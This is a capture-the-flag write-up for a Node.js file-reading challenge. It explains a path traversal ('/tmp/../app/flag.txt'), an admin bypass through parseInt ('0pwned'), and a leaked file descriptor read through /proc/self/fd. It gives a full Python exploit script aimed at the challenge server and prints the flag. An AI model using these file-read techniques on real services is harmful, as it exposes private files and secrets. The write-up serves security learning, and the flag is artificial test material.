# Unhackable Cloud Storage

# Unhackable Cloud Storage

### Description

There is no way you can read the flag at `/app/flag.txt`

[http://64.227.131.98:40002/](http://64.227.131.98:40002/)

[chall.zip](https://hackcon.in/files/030930b9b72acb9392e59570aee6e6b9/chall.zip?token=eyJ1c2VyX2lkIjo1NDAsInRlYW1faWQiOjM1NSwiZmlsZV9pZCI6MjV9.ZOt4dQ.-ygIlwQSBjAYTgkjmfws3EbURCA)

### Lab

`package.json` wasnt provided, but it can be easily generated.

1. `npm init` (hit Enter for most part for defaults)
2. `npm install express` (Install needed library)
3. Add `"type": "module"` in `package.json` so node can run it.
4. Add script: `"start": "node index.js"`

Final `package.json`:

```json
{
  "name": "unhackablecloudstorage",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "start": "node index.js"
  },
  "author": "",
  "license": "ISC",
  "type": "module",
  "dependencies": {
    "express": "^4.18.2"
  }
}
```

* Change `process.env.ADMIN_PASSWORD` to fixed string if you dont want to configure dotenv.

### Analysis

Application is simple, it allows to read files if certain checks are met.

```js
app.get("/bucket", (req, res) => {
    // Must Be Authorized
    if (!authOnly(req, res)) { return; }

    // Get filepath from GET query
    const filePath = (req.query.file_path ?? "").toString();

    if (!filePath.startsWith("/tmp")) { // If filepath doesnt start with /tmp
        if (!adminOnly(req, res)) {     // and user isnt admin exit
            return;
        }
    }
    res.send(getFileContent(filePath)); // Send File
});
```

First vulnaribility spotted, directory traversal. If we supply `/tmp/../app/flag.txt` we are able to read file with user priviledges.

Second vulnaribility (not needed): adminOnly

```js
const adminOnly = (req, res) => {
    // Get userID from GET query
    const userId = req.query.user_id ?? "";

    // If Userid isnt equal to admin it means user isnt admin
    if (parseInt(userId) != admin_id) { return false; }

    // If userid equals to admin return True
    return true;
};
```

While the code seems safe `parseInt` doesnt work as intended (JavaScript 💦)

```js
> parseInt("42")
42 // Expected
> parseInt("42AndEverythingAfter")
42 // Not Expected
> parseInt("ButNot42")
NaN // Somewhat expected
```

So if userID is `0{anything}` and because of no sanitization of parameters we are essentially admin user.

Now let's address the main function of the application: getFileContent

```js
const getFileContent = (filePath) => {
    // Open file
    const f = fs.openSync(filePath, "r");

    // Check if flag is inside filename
    if (filePath.includes("flag")) {
        return "[No flag for you]"; // If true quit
    }

    const buf = Buffer.alloc(100);  // Allocate buffer
    fs.readSync(f, buf, 0, 100, 0); // Read 100 bytes into buffer
    fs.closeSync(f);                // Close file

    const fileContent = buf.toString();

    return fileContent; // Send file contents
};
```

If you notice something weird happens. First the file is opened, then it's checked for filtered word, if the blacklisted word is not inside filename we get back file contents. But what happens if blacklisted word is inside? First file gets opened, filtered and exits. Ok..? So what? **The File Descriptors**

_A file descriptor is an integer that identifies an open file. **File descriptors are used to access files in the operating system**._\
&#xNAN;_&#x45;ach file descriptor has a unique number that is assigned to it when the file is opened. This number is used to refer to the file in subsequent operations, such as reading from or writing to the file._\
&#xNAN;_&#x46;ile descriptors are also used to keep track of the state of a file. **For example, a file descriptor can be used to indicate whether a file is open, closed, or in use**._

So somewhere in the system there's open file descriptor for the flag.txt always in read mode and waiting to be closed. From docker image we know that application runs on Unix and file descriptors in Unix systems can be found in `/proc/{PID}/fd/` directory.

First lets find descriptor inside the lab.

```bash
└─$ ps aux --forest | grep "node index.js" -B3
user    28540  0.1  0.1  13984  7832 pts/2    Ss   20:29   0:03 |   \_ /usr/bin/zsh
user    50233  3.0  1.4 727272 71000 pts/2    Sl+  21:12   0:02 |   |   \_ npm start
user    50261  0.0  0.0   2584  1536 pts/2    S+   21:12   0:00 |   |       \_ sh -c node index.js
user    50262  1.2  1.2 11132100 59964 pts/2  Sl+  21:12   0:01 |   |           \_ node index.js # <-- 
        ^^^^^ 
        PID

└─$ la /proc/50262/fd/
Permissions Size User Date Modified Name
lrwx------    64 user 27 Aug 21:13   0 -> /dev/pts/2
lrwx------    64 user 27 Aug 21:12   1 -> /dev/pts/2
lrwx------    64 user 27 Aug 21:12   2 -> /dev/pts/2
lrwx------    64 user 27 Aug 21:13   3 -> anon_inode:[eventpoll]
lr-x------    64 user 27 Aug 21:13   4 -> pipe:[118660]
l-wx------    64 user 27 Aug 21:13   5 -> pipe:[118660]
lr-x------    64 user 27 Aug 21:13   6 -> pipe:[118661]
l-wx------    64 user 27 Aug 21:13   7 -> pipe:[118661]
lrwx------    64 user 27 Aug 21:13   8 -> anon_inode:[eventfd]
lrwx------    64 user 27 Aug 21:13   9 -> anon_inode:[eventpoll]
lr-x------    64 user 27 Aug 21:13   10 -> pipe:[119393]
l-wx------    64 user 27 Aug 21:13   11 -> pipe:[119393]
lrwx------    64 user 27 Aug 21:13   12 -> anon_inode:[eventfd]
lrwx------    64 user 27 Aug 21:13   13 -> anon_inode:[eventpoll]
lr-x------    64 user 27 Aug 21:13   14 -> pipe:[118662]
l-wx------    64 user 27 Aug 21:13   15 -> pipe:[118662]
lrwx------    64 user 27 Aug 21:13   16 -> anon_inode:[eventfd]
lrwx------    64 user 27 Aug 21:13   17 -> /dev/pts/2
lr-x------    64 user 27 Aug 21:13   18 -> /dev/null
lrwx------@   64 user 27 Aug 21:13   19 -> socket:[118670]
lrwx------    64 user 27 Aug 21:13   20 -> /dev/pts/2

# Register User
└─$ curl 'localhost:7500/register?user_id=Test&user_password=Test'                      
[+] User 'Test' registered

# Open File
└─$ curl 'localhost:7500/bucket?user_id=Test&user_password=Test&file_path=/tmp/flag.txt'
[No flag for you]     

└─$ la /proc/50262/fd/                                                                     
Permissions Size User Date Modified Name
lrwx------    64 user 27 Aug 21:23   0 -> /dev/pts/2
lrwx------    64 user 27 Aug 21:22   1 -> /dev/pts/2
lrwx------    64 user 27 Aug 21:22   2 -> /dev/pts/2
lrwx------    64 user 27 Aug 21:23   3 -> anon_inode:[eventpoll]
lr-x------    64 user 27 Aug 21:23   4 -> pipe:[130433]
l-wx------    64 user 27 Aug 21:23   5 -> pipe:[130433]
lr-x------    64 user 27 Aug 21:23   6 -> pipe:[130434]
l-wx------    64 user 27 Aug 21:23   7 -> pipe:[130434]
lrwx------    64 user 27 Aug 21:23   8 -> anon_inode:[eventfd]
lrwx------    64 user 27 Aug 21:23   9 -> anon_inode:[eventpoll]
lr-x------    64 user 27 Aug 21:23   10 -> pipe:[128748]
l-wx------    64 user 27 Aug 21:23   11 -> pipe:[128748]
lrwx------    64 user 27 Aug 21:23   12 -> anon_inode:[eventfd]
lrwx------    64 user 27 Aug 21:23   13 -> anon_inode:[eventpoll]
lr-x------    64 user 27 Aug 21:23   14 -> pipe:[130435]
l-wx------    64 user 27 Aug 21:23   15 -> pipe:[130435]
lrwx------    64 user 27 Aug 21:23   16 -> anon_inode:[eventfd]
lrwx------    64 user 27 Aug 21:23   17 -> /dev/pts/2
lr-x------    64 user 27 Aug 21:23   18 -> /dev/null
lrwx------@   64 user 27 Aug 21:23   19 -> socket:[127948]
lrwx------    64 user 27 Aug 21:23   20 -> /dev/pts/2
lr-x------    64 user 27 Aug 21:23   22 -> /tmp/flag.txt
```

And there we go, file descriptor with ID of 22 is the flag file.

```bash
└─$ cat /proc/50262/fd/22
d4rkc0de{LETMEIN}   
```

### Solution

Because in the Analysis section we did manual read on file descriptor we had to find process id, but since application does this for us we can utilize `/proc/self/` (self being the current process id).

_/proc/self/ directory is a link to our current running processes. Remember that in Linux everything is a file._

```py
import requests

URL = 'http://64.227.131.98:40002'
REGISTER = URL + '/register'
BUCKET   = URL + '/bucket'

# Register User
user = {"user_id": "0pwned", "user_password": "pwned"}
resp = requests.get(REGISTER, params=user)
print(resp.text)

# Open Flag
payload = {**user, "file_path": f"/app/flag.txt"}
resp = requests.get(BUCKET, params=payload)
print("[*] Flag Buffer Opened")

# Read FD
for i in range(32, 2, -1):
    payload = {**user, "file_path": f"/proc/self/fd/{i}"}
    resp = requests.get(BUCKET, params=payload)
    if resp.status_code != 500:
        print(f"Found Readable File: {resp.text}{' '*16}")
        if 'd4rk' in resp.text: break
    print(f"Trying File Descriptor: /proc/self/fd/{i}")    
```

```bash
➜ py .\UnhackableCloudStorage\exploit.py
[+] User '0pwned' registered
[*] Flag Buffer Opened
Trying File Descriptor: /proc/self/fd/32
Trying File Descriptor: /proc/self/fd/31
Trying File Descriptor: /proc/self/fd/30
Trying File Descriptor: /proc/self/fd/29
Trying File Descriptor: /proc/self/fd/28
Found Readable File: d4rk{d0nt_leav3_0pen_fDs}c0de
```

::: tip Flag
`d4rk{d0nt\_leav3\_0pen\_fDs}c0de`
:::

#### Note

[PwnFunction](https://www.youtube.com/@PwnFunction) goes into more details with practical live example: [https://youtu.be/6SA6S9Ca5-U](https://youtu.be/6SA6S9Ca5-U)
